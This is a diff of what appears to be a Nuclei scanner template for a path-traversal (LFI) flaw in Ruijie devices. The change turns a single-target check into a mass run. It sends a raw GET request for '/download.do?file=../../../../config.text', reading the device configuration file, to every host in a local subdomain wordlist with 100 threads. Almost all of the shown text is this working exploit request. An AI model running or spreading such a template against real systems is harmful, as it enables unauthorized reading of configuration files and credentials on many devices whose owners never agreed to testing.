@@ -8,9 +8,18 @@ info:
   tags: ruijie,lfi
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/download.do?file=../../../../config.text"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /download.do?file=../../../../config.text HTTP/1.1
+        Host: {{Subdomains}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
     matchers-condition: and
     matchers:
 
